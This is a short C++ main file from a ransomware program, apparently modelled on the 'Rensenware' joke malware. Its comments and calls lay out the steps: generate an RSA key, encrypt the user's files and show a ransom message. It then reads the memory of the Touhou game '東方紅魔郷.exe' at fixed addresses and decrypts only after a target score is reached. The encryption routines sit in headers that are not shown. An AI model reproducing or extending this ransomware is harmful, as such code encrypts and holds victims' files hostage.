#include "Ransom.h"
#include "MemorySniff.h"
#include "GameProfile.h"

/*
* Steps of the program
*
* 1- Generate RSA key
* 2- Write RSA key to file to prevent accidental wrong encryption
* 3- Encrypt files
* 4- Show message that files were encrypted
* 5- Ask that the game can be played
* 6- Wait for the game to be launched
* 7- Read memory of game to find value
*/
int main()
{
	Ransom ecr;
	ecr.run_encryption_logic();

	game_profile game{
		"東方紅魔郷.exe",
		0x0069BCB0, // Difficulty address is at -> 0x0069BCB0
		0x0069BCA0, // Scoring points seem to be at a static address -> 0x0069BCA0
		2000
	};

	MemorySniff sniff(&game);
	sniff.sniff_process();
	ecr.run_decryption_logic();
}
